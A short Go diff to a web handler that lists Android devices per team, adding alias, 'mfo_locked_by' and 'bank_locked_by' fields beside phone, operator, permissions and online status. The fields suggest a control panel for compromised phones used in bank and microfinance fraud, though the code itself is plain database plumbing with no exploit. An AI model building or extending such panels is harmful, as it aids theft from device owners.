@@ -94,7 +94,8 @@ func HandleDevices(w http.ResponseWriter, r *http.Request) {
 
 	rows, err := db.DB.Query(
 		`SELECT device_id, model, android_version, country, is_online, battery_level, permissions, device_type, last_seen, created_at,
-		        COALESCE(phone,''), COALESCE(operator,''), COALESCE(label,''), COALESCE(notes,'')
+		        COALESCE(phone,''), COALESCE(operator,''), COALESCE(label,''), COALESCE(notes,''),
+		        COALESCE(alias,''), COALESCE(mfo_locked_by,''), COALESCE(bank_locked_by,'')
 		 FROM devices WHERE team_id = ? AND COALESCE(deleted,0) = 0 ORDER BY created_at DESC`,
 		teamID,
 	)
@@ -107,14 +108,15 @@ func HandleDevices(w http.ResponseWriter, r *http.Request) {
 	var devices []map[string]any
 	for rows.Next() {
 		var d struct {
-			DeviceID, Model, Android, Country string
-			Online, Battery                   int
-			Permissions, DeviceType           string
-			LastSeen, CreatedAt               string
-			Phone, Operator, Label, Notes     string
+			DeviceID, Model, Android, Country    string
+			Online, Battery                      int
+			Permissions, DeviceType              string
+			LastSeen, CreatedAt                  string
+			Phone, Operator, Label, Notes        string
+			Alias, MfoLockedBy, BankLockedBy     string
 		}
 		rows.Scan(&d.DeviceID, &d.Model, &d.Android, &d.Country, &d.Online, &d.Battery, &d.Permissions, &d.DeviceType, &d.LastSeen, &d.CreatedAt,
-			&d.Phone, &d.Operator, &d.Label, &d.Notes)
+			&d.Phone, &d.Operator, &d.Label, &d.Notes, &d.Alias, &d.MfoLockedBy, &d.BankLockedBy)
 
 		perms := parsePermissions(d.Permissions)
 
@@ -143,6 +145,9 @@ func HandleDevices(w http.ResponseWriter, r *http.Request) {
 			"operator":        d.Operator,
 			"label":           d.Label,
 			"notes":           d.Notes,
+			"alias":           d.Alias,
+			"mfo_locked_by":   d.MfoLockedBy,
+			"bank_locked_by":  d.BankLockedBy,
 			"uptime_hours":    int(uptimeHours),
 		})
 	}
